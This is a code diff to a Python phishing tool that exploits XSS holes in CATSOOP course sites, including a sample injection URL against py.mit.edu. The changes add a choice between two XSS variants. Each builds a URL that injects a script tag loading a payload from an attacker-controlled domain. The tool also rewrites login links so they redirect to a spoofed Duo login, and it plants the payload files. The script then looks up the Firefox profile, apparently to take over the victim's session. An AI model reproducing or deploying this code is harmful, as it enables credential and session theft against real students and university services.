@@ -43,7 +43,8 @@ if get_bool("Fetch/Overwrite Entry URL site? y/n"):
     os.system("rm -rf {0}entry-site &&  \
         mkdir -p {0}entry-site &&       \
         cd {0}entry-site &&             \
-        wget -E -nH --cut-dirs=100 -k -K -p --no-check-certificate {1}"
+        wget -E -nH --cut-dirs=100 -k -K -p --no-check-certificate '{1}' && \
+        mv *.html index.html"
         .format(prefix, entry_url))
 
 # Prompt user if he wants to re-fetch / overwrite the exit webpage source
@@ -53,39 +54,40 @@ if get_bool("Fetch/Overwrite Exit URL site? y/n"):
     os.system("rm -rf {0}exit-site &&   \
         mkdir -p {0}exit-site &&        \
         cd {0}exit-site &&              \
-        wget -E -nH --cut-dirs=100 -k -K -p --no-check-certificate {1}"
+        wget -E -nH --cut-dirs=100 -k -K -p --no-check-certificate '{1}' && \
+        mv *.html final.html"
         .format(prefix, entry_url))
     
-    # Rename the exit site's main html page to final.html
-    # needed for re-direction in the DUO spoofer later on
-    index = exit_url.split("/")[-1]
-    if not index.endswith(".html"):
-        print("Warning, assuming html exit site index file...")
-        if index == "": index = "index"
-        index += ".html"
-    os.system("mv {0}exit-site/{1} {0}exit-site/final.html"
-        .format(prefix, index))
-
 # If domain wasn't set through cmd args, prompt user
 if domain == "": 
+    print("Domain name?")
     domain = input("Domain name that redirects to this machine? " \
                 + "Example: hacker.ml. Domain: ")
 print("Redirection domain:", domain)
 
+exploit = input("Which XSS vulnerablity do you want to use?\n\
+        0: Spring 2020 (All CATSOOP sites)\
+        1: Fall 2021 (modern sites with /recitation? in url)")
+
 # Generate phising URL. This is where the actual XSS vulnereability is
 # being exploited. This url will inject payload.js into the user's site
-phishing_url = "/".join(entry_url.split("/")[0:4]) \
+if exploit == "0": 
+    phishing_url = "/".join(entry_url.split("/")[0:4]) \
                 + "/%3cscript%20src=%68ttps%3a" \
                 + domain + "/"
+elif exploit == "1": 
+    #https://py.mit.edu/fall20/recitation?rec=%3Cscript%20src=//mitx.ml/%3E
+    phishing_url = "/".join(entry_url.split("/")[0:4]) \
+                + "/recitation?rec=%3cscript%20src=//" \
+                + domain + "/%3e"
+else: 
+    print("Unknown exploit selected... Exiting...")
+    sys.quit()
 
 # Patch the entry site so that when a victim clicks login, they will
 # be re-directed to the malicious duo spoofer
 print("Patching Entry Site...")
-index = entry_url.split("/")[-1]
-if not index.endswith(".html"):
-    print("Warning, assuming html entry site index file...")
-    if index == "": index = "index"
-    index += ".html"
+index = "index.html"
 
 entry_index_file = "{}entry-site/{}".format(prefix, index)
 print("Patching index file:", entry_index_file)
@@ -121,7 +123,9 @@ with open(entry_index_file, "r+") as index_file:
 
     # make login links clickable, triggering js nextWin() 
     for link in soup.find_all('a'):
-        if "href" in link.attrs.keys() and "loginaction" in link["href"]:
+        if "href" in link.attrs.keys() and \
+            ("loginaction" in link["href"] \
+            or "javascript" in link["href"]):
             del link["href"]
             link["onclick"] = "window.nextWin()"
             link["style"] = "cursor:pointer"
@@ -154,13 +158,19 @@ with open(prefix + "../payload.js", "r") as payload_template_file:
         window.ORIG_DOM='{}';           \
         window.PHISHING_URL='{}';       \
         window.FINAL_DOM='{}';          \
-        {}".format(attack_url, entry_url, phishing_url, exit_url, payload)
+        window.EXPLOIT_NUM='{}';          \
+        {}".format(attack_url, entry_url, 
+                phishing_url, exit_url, exploit, payload)
 
-    # place payload into domain:/'</pre where / are dir separators
-    # and payload.js gets renamed to pre
-    os.system("mkdir -p " + prefix + "\\'\\<")
-    with open(prefix + "'</pre", "w") as payload_file:
-        payload_file.write(payload)     
+    if exploit == "0":
+        # place payload into domain:/'</pre where / are dir separators
+        # and payload.js gets renamed to pre
+        os.system("mkdir -p " + prefix + "\\'\\<")
+        with open(prefix + "'</pre", "w") as payload_file:
+            payload_file.write(payload)     
+    elif exploit == "1":
+        with open(prefix + "index.html", "w") as payload_file:
+            payload_file.write(payload)     
 
 # Guess the firefox home path to verify that profiles.ini exists
 # this is important, as when the victim authenticates succesfully in a
